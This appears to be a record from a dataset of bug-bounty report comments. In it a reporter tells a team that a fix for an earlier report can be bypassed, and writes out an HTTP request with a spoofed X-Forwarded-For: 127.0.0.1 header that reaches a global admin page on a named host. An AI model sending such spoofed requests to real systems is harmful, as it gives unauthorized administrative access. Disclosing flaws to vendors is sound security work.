      "id": 26645,
      "category": "team",
      "content": "Hi team,\nI found bypass of report #870709. Just by using X-Forwarded-For: 127.0.0.1 you can again get access to global admin page.\n\nBypass request Request\n\n```\nGET /pagespeed-global-admin/ HTTP/1.1\nHost: webtools.paloalto.com\nX-Forwarded-For: 127.0.0.1\n```",
